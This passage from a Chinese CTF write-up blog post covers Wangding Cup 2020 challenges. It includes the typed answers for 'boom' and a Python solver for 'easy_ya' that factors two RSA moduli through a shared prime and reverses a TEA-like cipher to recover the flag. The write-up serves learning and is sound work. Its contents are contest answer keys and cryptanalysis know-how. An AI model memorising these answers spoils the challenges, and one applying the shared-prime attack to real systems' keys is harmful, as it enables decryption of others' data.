result:</span><br><span class="line">		temp.append(i+mod)</span><br><span class="line">		temp.append(i)</span><br><span class="line"></span><br><span class="line">	result.clear()</span><br><span class="line">	mod = mod*<span class="number">2</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> temp:</span><br><span class="line">		<span class="keyword">if</span>(pow(m,i,mod) == c%mod):</span><br><span class="line">			result.append(i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> result:</span><br><span class="line">	print(str(i.to_bytes(<span class="number">64</span>,<span class="string">'big'</span>)))</span><br></pre></td></tr></table></figure>
<h3 id="boom">boom</h3>
<p>按照提示完成即可拿到flag，注意windows用cmd跑，不然会闪退。</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">en5oy</span><br><span class="line"><span class="attribute">x</span>=74 <span class="attribute">y</span>=68 <span class="attribute">z</span>=31</span><br><span class="line"><span class="attribute">x</span>=89127561</span><br></pre></td></tr></table></figure>
<h3 id="easy-ya">easy_ya</h3>
<p>这题在比赛的时候有做过，但是时间关系做不动了。一个环境题，需要利用题目给出的n1、c1、n2和c2，用RSA逆推出ek，其中可以利用n1和n2质因数相同求出n1的质因数分解。这题后面也没复现了，可以看一下[这位师傅]的脚本。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> n2s,s2n</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">n1 = <span class="number">523302236767994199900474363344509016779069116440336509402579663927023212822016176967224920257215697515649639915194389392664393435704126520500342935380422629852958893595198501678886910437288107490865842806189885864227955305292596726620737250011643028592306930279653650874633693082819617471411085797465171317473575199984137570425840763157847215554005503026976635376775672263338018024842152016782550728415532850496820668169596712488535626476321971915772540785626943870257914929277013026283202706480202573253694027965561121582254805059775814137542861056288774182091519461752761702279929984980399296157122817271523455097901334302748985253698791419583126820263035649222528798493821648538568572195005358978375666451378629463679501572550304224399031869931606326980885244883575380615433423693907673692911481956161922234589747374211957098461625670478121184734721478951324090304946630772999533103517416951906651316589244984076827527352185687877958699658011472950078992791104307370649334689901210147765149584862868749574640976109508247204313701721196275177445231013673265642224568068643851710967790673640935447579098048865343477978938147696617434878198467680874826616766904653374028721826187308127128623535689512750830887981058826202565202400511</span></span><br><span class="line">c1 = <span class="number">498116479126828060721351777093052860074248131123861633687756928866328288114135612849582257727497809922257024131348207980532057240060103798568227977564521497134127080257805342446192248133124844549442334197110567598270256443362563074473166503647429611051333058467042150637666479765740465760837773368463067714839472516227071241189038004851446423799255357523722335018334006275302424683874359612832738469924300750750078529793617519763670882091967677827342326944222743651042579235831828367996040140715066967834876505105847352068608085060284716208922782057542541292881761158407247706056426656079240060590899310402168208571288608455268870805780135942398347873755131825844602660879197979908250552518202142180574849619997871142575611493295891685289794234943270549985371377356916876993228441993132176346052582480841840804748103391892367360829385946406970449784716173650039815882209635063166095389007982620077884907738945623441531598991729082106049943909989119158441101967074276580858829052824691525753913860208906309655761578594225039981683717544420716889594252263165426914121554799496094906541367521362681696570717997925590955291849918357945303214885384216817697786187947817980231717851370305526120464677525392225631245022522492166336294567990</span></span><br><span class="line">n2 = <span class="number">536990588699972595171044696252776619032179414787125154102250364726703105272855466989014009336094247702108918440942171080587326115929077717421949560294869471182366684971337895133599697112193778007924450399107079732471847945598232349103839178632745959014098099259478108015237884846605377823461726458684486899249980041743056079896277510838968230729745020510029386228057731944169220820085059789541971092769832034181463596023438597531006332700648910769750936607476390311140301912742677001065893470340950419360642998700303488716826766066363262819042158064398656956185348135880225267894029419814797931720405594656777311094389676998338309809990367862926139317751409984908306801799152005179724137997626023826392780245630698648023945119617679627945415398046106871715475183890738417311925747430222040725394347022734489930069712092197629163647317772330355887387543008085150959104427391942023985298997288368357638062454066636100000548473809891299732343069825793293706407805782587150123342081839983609199059401502925783039760450730519603070519136086703825438807058787688044991172737575437559249668471352046085614345186161595152256193672994722540039920217058451215889862638946510188311582046866299423997659515395934871167522463706085186962242421859</span></span><br><span class="line">c2 = <span class="number">164402111514416870480151927449107349163820084533580709383993929301187569338852498622073106678649496858117593538947720740640339668153033620409471744700183709591276280704323985437330452541949262852531710176243561888397374683972759177181684560891529123569371241980602358823138808014488471284855401456011020109937046905434967828616466812821052222924691090808870700970795942705766163862790406417148540210339722273902825469460099520769061522024042123766536620554426683612099219790921573403278241760344418925630823806366949039901279532624187976211611528860461687073096888450694175459321193571925480949635977079339284905452476161156840739751431793628217796061271713787710176980187083301171958573364765677389306720995362317264018186392366551999368657422142163919262968449796794407119199996178284891867472060688293602896147398028717874542567143635071645595076767066361989345197270110842062044509038468406120271061465308775126927579741460684420290619983532930017201223504143911140388202527374930493248620993306321032961537876323380443523093814730204234290659449391857198796743587265894069493376291713198073023178977070834614584650913597763729414655680380751407408769289343905637501434637829997447542901620528323133332447667258731683700542347651</span></span><br><span class="line">p = gmpy2.gcd(n1, n2)</span><br><span class="line">q1 = n1 // p</span><br><span class="line">q2 = n2 // p</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">phi1 = (p<span class="number">-1</span>)*(q1<span class="number">-1</span>)</span><br><span class="line">d1 = gmpy2.invert(e, phi1)</span><br><span class="line">m = pow(c1, d1, n1)</span><br><span class="line">ek = n2s(m)</span><br><span class="line"></span><br><span class="line">key = <span class="string">'8891898088b197a0bfa78199b28195bfae89'</span>.decode(<span class="string">'hex'</span>)</span><br><span class="line">limit = <span class="keyword">lambda</span> n: n &amp; <span class="number">0xffffffff</span></span><br><span class="line"></span><br><span class="line">Key  = [ord(i) <span class="keyword">for</span> i <span class="keyword">in</span> key]</span><br><span class="line">a = limit((Key[<span class="number">0</span>] &lt;&lt; <span class="number">24</span>) | (Key[<span class="number">1</span>] &lt;&lt; <span class="number">16</span>) | (Key[<span class="number">2</span>] &lt;&lt; <span class="number">8</span>) | Key[<span class="number">3</span>])</span><br><span class="line">b = limit((Key[<span class="number">4</span>] &lt;&lt; <span class="number">24</span>) | (Key[<span class="number">5</span>] &lt;&lt; <span class="number">16</span>) | (Key[<span class="number">6</span>] &lt;&lt; <span class="number">8</span>) | Key[<span class="number">7</span>])</span><br><span class="line">c = limit((Key[<span class="number">8</span>] &lt;&lt; <span class="number">24</span>) | (Key[<span class="number">9</span>] &lt;&lt; <span class="number">16</span>) | (Key[<span class="number">10</span>] &lt;&lt; <span class="number">8</span>) | Key[<span class="number">11</span>])</span><br><span class="line">d = limit((Key[<span class="number">12</span>] &lt;&lt; <span class="number">24</span>) | (Key[<span class="number">13</span>] &lt;&lt; <span class="number">16</span>) | (Key[<span class="number">14</span>] &lt;&lt; <span class="number">8</span>) | Key[<span class="number">15</span>])</span><br><span class="line"></span><br><span class="line">outputs = [<span class="number">0x65d4ce3b0b1b3f48bb9fdL</span>, <span class="number">0xf0230f43414a9c9ac0488L</span>, <span class="number">0xbd592ebe04025b783fb5bL</span>, <span class="number">0x28d194dcd1c79b4bb8074L</span>, <span class="number">0x7c493be8f0fdbb740ec29L</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reversecalc</span><span class="params">(a, b, c, d, y, z, pad)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>, <span class="number">0</span>, <span class="number">-1</span>):</span><br><span class="line">        <span class="comment"># print 'Round %d: %d, %d' % (i, y, z)</span></span><br><span class="line">        pads = limit(pad * i)</span><br><span class="line">        paramz = (y*<span class="number">16</span>+c)^(y+pads)^((y&gt;&gt;<span class="number">5</span>)+d)</span><br><span class="line">        <span class="keyword">if</span>(z &lt; paramz):</span><br><span class="line">            z = limit(z - paramz + <span class="number">0x100000000</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            z = limit(z - paramz)</span><br><span class="line">        paramy = (z*<span class="number">16</span>+a)^(z+pads)^((z&gt;&gt;<span class="number">5</span>)+b)</span><br><span class="line">        <span class="keyword">if</span>(y &lt; paramy):</span><br><span class="line">            y = limit(y - paramy + <span class="number">0x100000000</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            y = limit(y - paramy)</span><br><span class="line">        <span class="comment"># print (y, z)</span></span><br><span class="line">    <span class="keyword">return</span> y, z</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> output <span class="keyword">in</span> outputs:</span><br><span class="line">    <span class="keyword">print</span> hex(output)</span><br><span class="line">    binout = bin(output)[<span class="number">2</span>:]</span><br><span class="line">    binout = <span class="string">'0'</span>*(<span class="number">84</span>-len(binout))+binout</span><br><span class="line">    y = int(binout[:<span class="number">32</span>], <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4096</span>):</span><br><span class="line">        bini = bin(i)[<span class="number">2</span>:]</span><br><span class="line">        bini = <span class="string">'0'</span>*(<span class="number">12</span>-len(bini))+bini</span><br><span class="line">        tmpbinpads = bini[<span class="number">0</span>:<span class="number">5</span>] + binout[<span class="number">32</span>:<span class="number">52</span>] + bini[<span class="number">5</span>:<span class="number">12</span>] + <span class="string">'00000'</span></span><br><span class="line">        pad = int(tmpbinpads, <span class="number">2</span>) / <span class="number">32</span></span><br><span class="line">        pads = limit(int(tmpbinpads, <span class="number">2</span>))</span><br><span class="line">        z = output ^ (y&lt;&lt;<span class="number">52</span>) ^ (pads&lt;&lt;<span class="number">20</span>)</span><br><span class="line">        y0, z0 = reversecalc(a, b, c, d, y, z, pad)</span><br><span class="line">        tmpstr = n2s(y0)+n2s(z0)</span><br><span class="line">        valid = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> tmpstr:</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">not</span> j <span class="keyword">in</span> string.printable)<span class="keyword">and</span>(j != <span class="string">'\x00'</span>):</span><br><span class="line">                valid = <span class="literal">False</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span>(valid):</span><br><span class="line">            <span class="keyword">print</span> tmpstr</span><br></pre></td></tr></table></figure>
</div><div class="tags"><a href="/tags/writeup/">writeup</a><a href="/tags/CTF/">CTF</a></div><div class="post-nav"><a class="pre" href="/2020/05/22/Defcon-CTF-Qual-2020-Web-WP/">Defcon_CTF_Qual_2020-Web-WP</a><a class="next" href="/2019/12/22/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AD%A6%E4%B9%A0-%E5%AF%86%E7%A0%81%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8/">密码学学习-密码硬件安全</a></div><div id="disqus_thread"><div class="btn_click_load"><button class="disqus_click_btn">阅读评论（请确保 Disqus 可以正常加载）</button></div><script type="text/javascript">var disqus_config = function () {
    this.page.url = 'http://www.xiaozzz.xyz/2020/05/13/网鼎杯2020-青龙组-部分WP/';
    this.page.identifier = '2020/05/13/网鼎杯2020-青龙组-部分WP/';
    this.page.title = '网鼎杯2020-青龙组-部分WP';
  };</script><script type="text/javascript" id="disqus-lazy-load-script">$.ajax({
url: 'https://disqus.com/next/config.json',
timeout: 2500,
type: 'GET',
success: function(){
  var d = document;
  var s = d.createElement('script');
  s.src = '//xiaoZz.disqus.com/embed.js';
  s.setAttribute('data-timestamp', + new Date());
  (d.head || d.body).appendChild(s);
  $('.disqus_click_btn').css('display', 'none');
},
error: function() {
  $('.disqus_click_btn').css('display', 'block');
}
});</script><script type="text/javascript" id="disqus-click-load">$('.btn_click_load').click(() => {  //click to load comments
    (() => { // DON'T EDIT BELOW THIS LINE
        var d = document;
        var s = d.createElement('script');
        s.src = '//xiaoZz.disqus.com/embed.js';
        s.setAttribute('data-timestamp', + new Date());
        (d.head || d.body).appendChild(s);
    })();
    $('.disqus_click_btn').css('display','none');
});</script><script type="text/javascript" id="disqus-count-script">$(function() {
     var xhr = new XMLHttpRequest();
     xhr.open('GET', '//disqus.com/next/config.json', true);
     xhr.timeout = 2500;
     xhr.onreadystatechange = function () {
       if (xhr.readyState === 4 && xhr.status === 200) {
         $('.post-meta .post-comments-count').show();
         var s = document.createElement('script');
         s.id = 'dsq-count-scr';
         s.src = 'https://xiaoZz.disqus.com/count.js';
         s.async = true;
         (document.head || document.body).appendChild(s);
       }
     };
     xhr.ontimeout = function () { xhr.abort(); };
     xhr.send(null);
   });
</script></div></div></div></div><div class="pure-u-1-4 hidden_mid_and_down"><div id="sidebar"><div class="widget"><div class="widget-title"><i class="fa fa-folder-o"> Categories</i></div><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-writeup/">CTF_writeup</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D/">Web漏洞介绍</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/">密码学</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BC%96%E7%A0%81%E4%B8%8E%E5%BC%80%E5%8F%91/">编码与开发</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-star-o"> Tags</i></div><div class="tagcloud"><a href="/tags/writeup/" style="font-size: 15px;">writeup</a> <a href="/tags/CTF/" style="font-size: 15px;">CTF</a> <a href="/tags/Web%E6%BC%8F%E6%B4%9E/" style="font-size: 15px;">Web漏洞</a> <a href="/tags/PHP/" style="font-size: 15px;">PHP</a> <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 15px;">反序列化</a> <a href="/tags/SSRF/" style="font-size: 15px;">SSRF</a> <a href="/tags/Web/" style="font-size: 15px;">Web</a> <a href="/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/" style="font-size: 15px;">密码学</a> <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%90%86%E8%AE%BA/" style="font-size: 15px;">网络安全理论</a> <a href="/tags/%E5%93%88%E5%B8%8C%E5%87%BD%E6%95%B0/" style="font-size: 15px;">哈希函数</a> <a href="/tags/%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%93%8D%E4%BD%9C/" style="font-size: 15px;">字符串操作</a> <a href="/tags/%E5%BC%80%E5%8F%91/" style="font-size: 15px;">开发</a></div></div><div class="widget"><div class="widget-title"><i class="fa fa-file-o"> Recent</i></div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2022/12/26/%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%90%E5%85%B8%E5%9E%8B%E4%BE%8B%E9%A2%98/">算法分析典型例题</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/09/11/%E7%BE%8A%E5%9F%8E%E6%9D%AF2020-WP/">羊城杯2020-WP</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/08/28/%E9%A6%96%E5%B1%8A%E9%92%93%E9%B1%BC%E5%9F%8E%E6%9D%AF%E9%83%A8%E5%88%86wp/">首届钓鱼城杯部分wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/05/26/HTTP-Smuggling-%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/">HTTP_Smuggling-请求走私</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/05/22/Defcon-CTF-Qual-2020-Web-WP/">Defcon_CTF_Qual_2020-Web-WP</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/05/13/%E7%BD%91%E9%BC%8E%E6%9D%AF2020-%E9%9D%92%E9%BE%99%E7%BB%84-%E9%83%A8%E5%88%86WP/">网鼎杯2020-青龙组-部分WP</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/12/22/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AD%A6%E4%B9%A0-%E5%AF%86%E7%A0%81%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8/">密码学学习-密码硬件安全</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/25/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AD%A6%E4%B9%A0-%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81/">密码学学习-分组密码</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/20/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AD%A6%E4%B9%A0-MAC%E4%B8%8EAEAD/">密码学学习-MAC与AEAD</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/17/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%9F%BA%E7%A1%80/">正则表达式基础</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-comment-o"> Recent Comments</i></div><script type="text/javascript" src="//xiaoZz.disqus.com/recent_comments_widget.js?num_items=5&amp;hide_avatars=1&amp;avatar_size=32&amp;excerpt_length=20&amp;hide_mods=1"></script></div><div class="widget"><div class="widget-title"><i class="fa fa-external-link"> Links</i></div><ul></ul><a href="https://momomoxiaoxi.com/" title="moxiaoxi" target="_blank">moxiaoxi</a></div></div></div><div class="pure-u-1 pure-u-md-3-4"><div id="footer">Copyright © 2022 <a href="/." rel="nofollow">xiaoZ's Blog.</a> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a><a rel="nofollow" target="_blank" href="https://github.com/tufu9441/maupassant-hexo"> Theme</a> by<a rel="nofollow" target="_blank" href="https://github.com/pagecho"> Cho.</a></div></div></div><a class="show" id="rocket" href="#top"></a><script type="text/javascript" src="/js/totop.js?v=0.0.0" async></script><script type="text/javascript" src="//lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js" async></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.0" async></script><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css"><script type="text/javascript" color="100,100,100" opacity="0.5" zIndex="-2" count="50" src="//cdn.bootcss.com/canvas-nest.js/1.0.1/canvas-nest.min.js"></script><script type="text/javascript" src="/js/codeblock-resizer.js?v=0.0.0"></script><script type="text/javascript" src="/js/smartresize.js?v=0.0.0"></script></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body></html>